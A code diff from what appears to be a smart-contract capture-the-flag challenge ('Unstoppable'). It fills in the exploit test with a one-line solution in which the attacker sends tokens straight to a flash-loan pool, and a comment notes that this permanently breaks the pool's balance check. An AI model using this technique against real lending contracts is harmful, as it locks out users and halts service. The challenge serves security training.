@@ -36,10 +36,17 @@ describe('[Challenge] Unstoppable', function () {
          // Show it's possible for anyone to take out a flash loan
          this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
          await this.receiverContract.executeFlashLoan(10, { from: someUser });
+        
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        // this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
+        //  await this.receiverContract.executeFlashLoan(10, { from: someUser });
+        const tx = await this.token.transfer(this.pool.address,10,{ from: attacker });
+        //we send 10 tokens and then the check can never complete.
+         //so we just need to transfer our tokens to the contract
+        // await tx.wait();
     });
 
     after(async function () {
